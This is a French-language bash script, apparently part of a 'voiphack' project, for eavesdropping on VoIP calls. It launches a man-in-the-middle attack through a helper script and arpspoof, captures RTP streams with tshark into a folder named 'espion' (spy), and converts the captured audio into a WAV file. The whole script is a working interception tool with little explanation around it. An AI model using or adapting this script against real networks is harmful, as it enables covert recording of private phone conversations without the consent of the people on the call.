#!/bin/bash


#Variables
DOSSIER=/var/voiphack/espion/capture

#Script

if [ ! -d "$DOSSIER" ]; then
	mkdir $DOSSIER
else
	rm $DOSSIER/*
fi

echo "Placement en homme du milieu"
echo "" > /tmp/conv
../mitm.sh & 

echo "Placement en homme du milieu réussi !"
echo ""

echo "Ecoute de la conversation en cours... "
echo ""
echo -e "\e[1m[CAPTURE EN COURS...]"
echo -e "\e[5m Appuyer sur entrée pour mettre fin à la capture :"
echo -e "\e[0m"
tshark -o "rtp.heuristic_rtp: TRUE" -z rtp,streams -w $DOSSIER/espion.pcap -b filesize:51200 -b files:100 >> /tmp/conv & 

read

killall tshark 2>&1 

echo -e "\e[1mInformations relatives à la conversation :"
more /tmp/conv

echo -e "\e[0m"
echo ""
echo  "Conversation sauvegardée dans le dossier $DOSSIER"
echo ""


echo  -e "\e[5m \e[1m Fin de l'écoute -\e[0m Arrêt du MITM et retour à la configuration de base :"
killall arpspoof

echo "Ecouter la conversation ?"

python3 project.py `ls $DOSSIER`

sox -r 8000 -e a-law -b 8 -c 1 `ls $DOSSIER/*.raw` $DOSSIER/output.wav
echo "Fichier .wav généré avec succès !"
